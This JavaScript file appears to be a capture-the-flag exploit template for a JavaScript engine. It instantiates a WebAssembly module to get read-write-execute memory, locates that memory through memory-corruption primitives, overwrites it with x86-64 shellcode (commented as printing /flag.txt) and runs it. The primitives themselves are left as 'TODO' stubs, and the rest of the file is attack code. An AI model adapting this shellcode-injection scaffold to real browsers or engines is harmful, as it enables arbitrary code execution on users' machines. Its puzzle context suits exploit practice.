var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shellcode = wasm_instance.exports.main;

function write32(addr, value) {
    throw Error("TODO implement write32()");
}

function read32(addr) {
    throw Error("TODO implement read32()");
}

function getaddr(obj) {
    throw Error("TODO implement getaddr()");
}

// Get the address of RWX memory.
var wasm_addr = getaddr(wasm_instance);
var rwx_low = read32(wasm_addr + 0x68 - 1);
var rwx_high = read32(wasm_addr + 0x6c - 1) * Math.pow(2, 32);
var rwx = rwx_low + rwx_high;

// Writes shellcode into WASM buffer. This shellcode will print /flag.txt.
write32(rwx + 0x0, 0x905f3eeb);
write32(rwx + 0x4, 0x48909090);
write32(rwx + 0x8, 0x204c031);
write32(rwx + 0xc, 0xff63148);
write32(rwx + 0x10, 0xec816605);
write32(rwx + 0x14, 0x8d480fff);
write32(rwx + 0x18, 0x89482434);
write32(rwx + 0x1c, 0xd23148c7);
write32(rwx + 0x20, 0xfffba66);
write32(rwx + 0x24, 0xfc03148);
write32(rwx + 0x28, 0xff314805);
write32(rwx + 0x2c, 0x1c78040);
write32(rwx + 0x30, 0x48c28948);
write32(rwx + 0x34, 0x104c031);
write32(rwx + 0x38, 0x8166050f);
write32(rwx + 0x3c, 0xc30fffc4);
write32(rwx + 0x40, 0xffffbde8);
write32(rwx + 0x44, 0x6c662fff);
write32(rwx + 0x48, 0x742e6761);
write32(rwx + 0x4c, 0x007478);

shellcode();

// END
